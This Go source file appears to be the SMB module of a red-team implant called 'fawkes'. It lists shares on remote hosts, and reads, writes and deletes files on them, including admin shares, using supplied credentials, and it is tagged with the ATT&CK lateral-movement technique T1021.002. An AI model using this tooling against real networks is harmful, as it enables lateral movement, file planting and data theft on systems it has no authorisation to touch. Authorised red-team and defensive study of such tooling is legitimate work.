package commands

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/hirochachacha/go-smb2"
)

type SmbCommand struct{}

func (c *SmbCommand) Name() string        { return "smb" }
func (c *SmbCommand) Description() string { return "SMB file operations on remote shares — list, read, write, delete files via SMB2 (T1021.002)" }

type smbArgs struct {
	Action   string `json:"action"`   // ls, cat, upload, rm, shares
	Host     string `json:"host"`     // target host
	Share    string `json:"share"`    // share name (e.g., C$, ADMIN$, ShareName)
	Path     string `json:"path"`     // file/directory path within share
	Username string `json:"username"` // DOMAIN\user or user
	Password string `json:"password"` // password
	Domain   string `json:"domain"`   // domain (optional, can be part of username)
	Content  string `json:"content"`  // file content for upload action
	Port     int    `json:"port"`     // SMB port (default: 445)
}

func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -action <ls|cat|upload|rm|shares> -host <target> -username <user> -password <pass>",
			Status:    "error",
			Completed: true,
		}
	}

	var args smbArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Host == "" || args.Username == "" || args.Password == "" {
		return structs.CommandResult{
			Output:    "Error: host, username, and password are required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Action == "" {
		return structs.CommandResult{
			Output:    "Error: action required. Valid actions: ls, cat, upload, rm, shares",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Port <= 0 {
		args.Port = 445
	}

	// Parse domain from username if DOMAIN\user format
	if args.Domain == "" {
		if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
			args.Domain = parts[0]
			args.Username = parts[1]
		} else if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Domain = parts[1]
			args.Username = parts[0]
		}
	}

	switch args.Action {
	case "shares":
		return smbListShares(args)
	case "ls":
		if args.Share == "" {
			return structs.CommandResult{
				Output:    "Error: -share required for ls action",
				Status:    "error",
				Completed: true,
			}
		}
		return smbListDir(args)
	case "cat":
		if args.Share == "" || args.Path == "" {
			return structs.CommandResult{
				Output:    "Error: -share and -path required for cat action",
				Status:    "error",
				Completed: true,
			}
		}
		return smbReadFile(args)
	case "upload":
		if args.Share == "" || args.Path == "" || args.Content == "" {
			return structs.CommandResult{
				Output:    "Error: -share, -path, and -content required for upload action",
				Status:    "error",
				Completed: true,
			}
		}
		return smbWriteFile(args)
	case "rm":
		if args.Share == "" || args.Path == "" {
			return structs.CommandResult{
				Output:    "Error: -share and -path required for rm action",
				Status:    "error",
				Completed: true,
			}
		}
		return smbDeleteFile(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown action %q. Valid: ls, cat, upload, rm, shares", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func smbConnect(args smbArgs) (*smb2.Session, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", args.Host, args.Port), 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("TCP connect to %s:%d: %v", args.Host, args.Port, err)
	}

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     args.Username,
			Password: args.Password,
			Domain:   args.Domain,
		},
	}

	session, err := d.Dial(conn)
	if err != nil {
		_ = conn.Close()
		return nil, fmt.Errorf("SMB auth to %s as %s\\%s: %v", args.Host, args.Domain, args.Username, err)
	}

	return session, nil
}

func smbListShares(args smbArgs) structs.CommandResult {
	session, err := smbConnect(args)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = session.Logoff() }()

	shares, err := session.ListSharenames()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error listing shares: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shares on \\\\%s (%d found)\n", args.Host, len(shares)))
	sb.WriteString(strings.Repeat("-", 40) + "\n")
	for _, share := range shares {
		sb.WriteString(fmt.Sprintf("  \\\\%s\\%s\n", args.Host, share))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func smbListDir(args smbArgs) structs.CommandResult {
	session, err := smbConnect(args)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = session.Logoff() }()

	share, err := session.Mount(args.Share)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = share.Umount() }()

	dirPath := args.Path
	if dirPath == "" {
		dirPath = "."
	}

	entries, err := share.ReadDir(dirPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error listing \\\\%s\\%s\\%s: %v", args.Host, args.Share, dirPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] \\\\%s\\%s\\%s (%d entries)\n", args.Host, args.Share, dirPath, len(entries)))
	sb.WriteString(fmt.Sprintf("%-12s  %-20s  %s\n", "Size", "Modified", "Name"))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	for _, entry := range entries {
		name := entry.Name()
		if entry.IsDir() {
			name += "/"
		}
		size := formatFileSize(entry.Size())
		modified := entry.ModTime().Format("2006-01-02 15:04:05")
		sb.WriteString(fmt.Sprintf("%-12s  %-20s  %s\n", size, modified, name))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func smbReadFile(args smbArgs) structs.CommandResult {
	session, err := smbConnect(args)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = session.Logoff() }()

	share, err := session.Mount(args.Share)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = share.Umount() }()

	f, err := share.Open(args.Path)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error opening \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = f.Close() }()

	// Get file info for size check
	info, err := f.Stat()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error getting file info: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Limit to 10MB to avoid memory issues
	const maxSize = 10 * 1024 * 1024
	if info.Size() > maxSize {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: file too large (%s). Max 10MB for cat. Use download for large files.", formatFileSize(info.Size())),
			Status:    "error",
			Completed: true,
		}
	}

	data, err := io.ReadAll(f)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading file: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] \\\\%s\\%s\\%s (%s)\n", args.Host, args.Share, args.Path, formatFileSize(info.Size())))
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	sb.WriteString(string(data))

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func smbWriteFile(args smbArgs) structs.CommandResult {
	session, err := smbConnect(args)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = session.Logoff() }()

	share, err := session.Mount(args.Share)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = share.Umount() }()

	f, err := share.OpenFile(args.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = f.Close() }()

	n, err := f.Write([]byte(args.Content))
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing file: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("[+] Written %d bytes to \\\\%s\\%s\\%s", n, args.Host, args.Share, args.Path),
		Status:    "success",
		Completed: true,
	}
}

func smbDeleteFile(args smbArgs) structs.CommandResult {
	session, err := smbConnect(args)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = session.Logoff() }()

	share, err := session.Mount(args.Share)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer func() { _ = share.Umount() }()

	err = share.Remove(args.Path)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error deleting \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("[+] Deleted \\\\%s\\%s\\%s", args.Host, args.Share, args.Path),
		Status:    "success",
		Completed: true,
	}
}

// formatFileSize is defined in find.go
